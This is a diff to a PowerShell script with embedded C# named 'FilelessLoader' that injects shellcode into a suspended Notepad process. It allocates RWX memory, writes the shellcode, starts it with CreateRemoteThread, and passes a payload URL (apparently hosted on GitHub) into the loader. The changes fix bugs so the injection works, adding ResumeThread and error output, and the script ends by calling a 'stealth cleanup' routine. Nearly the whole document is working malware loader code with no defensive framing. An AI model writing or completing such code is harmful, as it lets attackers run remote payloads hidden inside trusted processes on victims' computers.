@@ -54,8 +54,12 @@ public class FilelessLoader {
         uint dwCreationFlags, 
         IntPtr lpThreadId
     );
+    
+    // [FIX] Added ResumeThread to wake up the process
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint ResumeThread(IntPtr hThread);
 
-    // --- Corrected Data Structures (The Fix) ---
+    // --- Corrected Data Structures ---
     [StructLayout(LayoutKind.Sequential)]
     public struct STARTUPINFO
     {
@@ -102,10 +106,8 @@ public class FilelessLoader {
 
             Console.WriteLine("[*] Starting Notepad (Suspended)...");
             
-            // Initialize the structures correctly
             STARTUPINFO si = new STARTUPINFO();
-            si.cb = (uint)Marshal.SizeOf(si); // CRITICAL SIZE FIX
-            
+            si.cb = (uint)Marshal.SizeOf(si);
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
             
             // 0x4 = CREATE_SUSPENDED
@@ -116,6 +118,7 @@ public class FilelessLoader {
                 return; 
             }
 
+            Console.WriteLine("[*] Process ID: " + pi.dwProcessId);
             Console.WriteLine("[*] Allocating RWX Memory...");
             IntPtr remoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
 
@@ -128,10 +131,14 @@ public class FilelessLoader {
             IntPtr bytesWritten;
             WriteProcessMemory(pi.hProcess, remoteMem, shellcode, (uint)shellcode.Length, out bytesWritten);
 
-            Console.WriteLine("[*] Detonating...");
+            Console.WriteLine("[*] Detonating via Remote Thread...");
             CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteMem, IntPtr.Zero, 0, IntPtr.Zero);
             
-            Console.WriteLine("[+] Injection Complete.");
+            // [FIX] Resume the main thread so Notepad actually appears!
+            Console.WriteLine("[*] Waking up Notepad (ResumeThread)...");
+            ResumeThread(pi.hThread);
+            
+            Console.WriteLine("[+] Injection Complete. Notepad should be visible.");
         }
         catch (Exception e) {
             Console.WriteLine("[-] Critical Error: " + e.ToString());
@@ -166,13 +173,18 @@ try {
     Add-Type -TypeDefinition $Code -Language CSharp
 }
 catch {
-    Write-Error "Compilation Failed."
+    Write-Error "Compilation Failed. Details:"
+    $error[0] | Out-String
+    Read-Host "Press ENTER to exit..."
     exit
 }
 
-# [IMPORTANT] This is where your GitHub URL is actually used!
-# It passes the $PayloadUrl from the top of the script into the C# Execute() function.
+# Execute
 [FilelessLoader]::Execute($PayloadUrl)
 
 # Cleanup
 Invoke-StealthCleanup
+
+# [FIX] Pause so you can read the screen before it closes
+Write-Host "`n[!] Script Finished." -ForegroundColor Cyan
+Read-Host "Press ENTER to close this window..."
